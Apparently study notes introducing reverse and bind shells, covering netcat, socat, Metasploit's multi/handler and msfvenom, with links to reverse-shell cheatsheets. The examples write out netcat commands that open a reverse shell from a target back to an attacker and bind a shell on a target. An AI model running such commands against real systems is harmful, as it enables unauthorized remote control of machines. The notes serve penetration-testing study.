Intro to sending (reverse) and receiving (bind) shells:

    WHAT IS A SHELL?
        * A shell is what is used to interface with a command line environment (CLI).
        * Examples include: [bash or sh programs in Linux] [cmd.exe and powershell in Windows]
        * When targeting remote systems, it is sometimes possible to force an application running to execute arbitrary code. (RCE)
        * When this happens, we want to open a shell running on the target.

        ** We can either:
            1.  Force server to send command line access to the server (reverse shell).
            2.  Force server to open a port, we connect and execute further commands (bind shell).

    TOOLS:
    **"In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell"
        NETCAT:
            * Swiss army knife of networking. 
            * Can be used to receive reverse shells, or connect to remote ports attached to bind shells.
            * Netcat shells are very unstable, but this can be improved.
            * Netcat comes installed on practically all Linux distros.

        SOCAT:
            * Netcat on steroids. Can do much more.
            * SYNTAX IS MORE DIFFICULT.
            * SOCAT RARELY INSTALLED BY DEFAULT.
            
        METASPLOIT -- MULTI/HANDLER:
            * This module [exploit/multi/handler] is used to receive reverse shells.
            * Due to being part of Metasploit, full fledged way to obtain stable shells. Options to improve shell.
            * Only way to interact with Meterpreter shell.
            * Easiest way to handle staged payloads.

        MSFVENOM:
            * Part of the Metasploit framework. Can be shipped as a standalone tool.
            * MSFVENOM is used to generate payloads on the fly.

        **OUTSIDE OF THESE TOOLS, THERE ARE REPOS CONTAINING LOTS OF SHELLS FOR DIFFERENT LANGUAGES.

        * Payloads all the Things           "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
        * PentestMonkey Cheatsheet          "https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        * SecLists (mostly for wordlists)   "https://github.com/danielmiessler/SecLists"


        TYPES OF SHELLS:
            * "Reverse Shells":
            [
                * Target is forced to execute code that connects back to your (attacker) PC.
                * On our PC, we use Netcat or otherwise to set up a listener to receive.
                * Good for dodging firewall rules governing connection to ports on server.
                ** Drawback, if we were trying to receive a shell from machine across internet, need to configure OUR network to accept shell.
            ]

            Example Reverse Shell:
                1.  [sudo nc -lvnp 443]                 Set up listener on attacking machine
                2.  [nc <LOCAL-IP> <PORT> -e /bin/bash] On the target machine
                *** "Attacking machine listens, target sends a connection back."


            * "Bind Shells":
            [
                * Code executed on target is used to start a listener attached to a shell directly on the target.
                * This is opened up to the internet. Connect to specific port, achieve RCE.
                * This is often blocked by firewalls.
                * Don't need to configure our network!
            ]

            Example Bind Shell:
                1.  [nc -lvnp <port> -e "cmd.exe"]      On the target
                2.  [nc 10.10.143.29 <port>]            On the attacking machine

                ** Not specific to windows!
                *** "Listening on the target, connecting to it on our own machine"

            INTERACTIVITY:
                * Shells can either be interactive or non interactive.

                INTERACTIVE SHELLS:
                [
                    * Powershell, bash, zsh, sh, etc. 
                    * These are CLI that allow us to interact with programs after they are launched.
                    * Example, SSH asks for authentication (username, password). This is interactive, requires an interactive shell.
                ]

                NON-INTERACTIVE SHELLS:
                [
                    * No interaction facilitated after executing program.
                    * Hence limited to programs that do not require user interaction.
                    * UNFORTUNATELY, MOST REVERSE/BIND SHELLS ARE NON INTERACTIVE!
                    * As a result, can make exploitation difficult.
                    Example: whoami executes perfectly, SSH does not. Bc whoami requires no input!
                ]
                